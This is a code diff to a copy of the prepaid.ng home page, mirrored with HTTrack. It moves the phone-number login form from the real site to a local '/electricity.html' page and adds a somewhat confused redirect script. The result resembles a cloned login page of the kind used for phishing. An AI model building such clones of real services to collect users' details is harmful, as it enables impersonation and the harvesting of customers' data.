@@ -117,7 +117,7 @@
                         </div>
                         <div class="col-md-8 col-lg-8 col-xl-8 lg-ml-45px">
                             <div class="justify-content-center loginCheck">
-                                <form method="post" action="https://prepaid.ng/home" id="loginCheck" name="loginCheck"
+                                <!-- <form method="post" action="/electricity.html" id="loginCheck" name="loginCheck"
                                     class="md-pt-20px">
                                     <input type="hidden" name="_token" value="eWnGRyrbauwAjn2A8p0h3HqMOf7t293bZ9WsgKbE">
                                     <input type="number" class="form-control phone_input lg-font-20 m-h-btn color-black"
@@ -127,10 +127,22 @@
                                     <div class="button-btn">
                                         <button
                                             class="continue_button slide background-pink text-white text-uppercase px-5 py-3 mt-5px">
-                                            <span class="text">Continue</span>
+                                            <span class="text"> Continue</span>
                                         </button>
-                                        <!-- <button
-                                            class="background-pink btn text-white text-uppercase px-5 py-3 mt-5px lg-font-24 md-font-24 btn-continue">Continue</button> -->
+                                        <button
+                                            class="background-pink btn text-white text-uppercase px-5 py-3 mt-5px lg-font-24 md-font-24 btn-continue">Continue</button>
+                                    </div>
+                                </form> -->
+                                <form method="post" action="/electricity.html" id="loginCheck" name="loginCheck" class="md-pt-20px">
+                                    <input type="hidden" name="_token" value="eWnGRyrbauwAjn2A8p0h3HqMOf7t293bZ9WsgKbE">
+                                    <input type="number" class="form-control phone_input lg-font-20 m-h-btn color-black"
+                                        id="phone" name="phone" required autocomplete="phone" autofocus
+                                        placeholder="Enter Your Phone Number">
+                                    <div id="res"></div>
+                                    <div class="button-btn">
+                                        <button class="continue_button slide background-pink text-white text-uppercase px-5 py-3 mt-5px">
+                                            <span class="text"> Continue</span>
+                                        </button>
                                     </div>
                                 </form>
                             </div>
@@ -342,4 +354,21 @@
 
 <!-- Mirrored from prepaid.ng/home by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Jul 2023 12:12:41 GMT -->
 
+<script>
+    document.getElementById('loginCheck').addEventListener('submit', function(event) {
+        // Prevent the default form submission
+        event.preventDefault();
+    
+        // Perform any client-side validation if needed
+    
+        // Submit the form using JavaScript
+        this.submit();
+    
+        // Reload the page after form submission
+        window.location.reload();
+    
+        // Redirect to a different page after the page has been reloaded
+        window.location.href = "/electricity.html"; // Replace with your desired URL
+    });
+    </script>
 </html>
